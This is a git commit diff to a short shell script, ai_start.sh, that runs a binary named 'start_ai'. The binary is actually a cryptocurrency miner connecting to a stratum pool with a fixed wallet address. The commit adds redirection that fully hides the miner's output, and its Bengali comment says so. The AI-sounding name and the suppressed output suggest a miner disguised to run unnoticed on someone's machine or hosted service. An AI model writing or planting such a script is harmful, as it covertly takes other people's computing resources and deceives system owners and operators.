b9e2e8b40a534ce8f844ae0d344b6a0819d859ff
Shoikat Hossain <shoikathossain22@gmail.com>
2025-07-08 14:47:25 +0600

    Update ai_start.sh

--- ai_start.sh
+++ ai_start.sh
@@ -1,7 +1,6 @@
 #!/bin/bash
 
-# Executable বানানো
 chmod +x start_ai
 
-# মাইনিং শুরু
-./start_ai -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7 -p x -t 2
+# মাইনিং চালাও, আউটপুট সম্পূর্ণ লুকিয়ে (stdout + stderr)
+./start_ai -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7 -p x -t 2 > /dev/null 2>&1
